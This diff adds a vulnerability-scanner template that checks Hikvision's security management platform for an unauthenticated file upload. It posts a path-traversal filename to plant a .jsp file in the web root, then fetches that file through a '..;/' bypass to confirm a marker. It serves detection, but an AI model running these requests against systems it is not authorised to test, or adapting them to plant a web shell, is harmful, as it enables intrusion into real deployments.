@@ -1,0 +1,53 @@
+id: hikvision-file-upload
+info:
+  name: Hikvision Comprehensive Security Management Platform Report File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+        Content-Length: 304
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{t1}}.jsp"
+        Content-Type: application/zip
+
+        {{t2}}
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"data\":null"
+          - "msg"
+
+  - method: GET
+    path:
+      - "/portal/ui/login/..;/..;/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
